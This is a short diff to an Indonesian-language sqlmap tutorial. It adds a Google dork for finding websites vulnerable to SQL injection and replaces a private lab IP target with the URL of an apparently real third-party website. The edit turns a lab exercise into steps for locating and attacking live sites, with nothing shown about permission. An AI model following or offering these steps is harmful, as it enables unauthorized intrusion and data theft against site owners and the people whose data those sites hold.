@@ -207,8 +207,13 @@ Clone git project sqlmap
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 
-Jalankan menggunakan python
+Cari website yang vulnerable melalui google dengan cara
+```bash
+inurl:index.php?id=
+```
+
+Jalankan sqlmap menggunakan python
 ```bash
 cd sqlmap
-python sqlmap.py -u '192.168.56.102/info.php?id=1'
+python sqlmap.py -u 'http://www.icdcprague.org/index.php?id=10'
 ```
